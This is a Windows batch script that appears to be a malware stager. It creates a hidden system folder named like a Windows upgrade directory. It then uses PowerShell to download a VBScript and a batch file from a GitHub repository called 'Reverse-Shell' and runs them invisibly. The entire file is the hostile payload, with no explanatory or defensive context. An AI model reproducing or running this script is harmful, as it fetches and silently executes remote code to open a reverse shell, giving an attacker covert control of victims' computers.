@echo off
c:
cd C:\
mkdir $WINDOWS.~GG
attrib +s +h $WINDOWS.~GG
cd $WINDOWS.~GG
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/invisible.vbs -Outfile invisible.vbs"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/run2.bat -Outfile run2.bat"
wscript.exe invisible.vbs run2.bat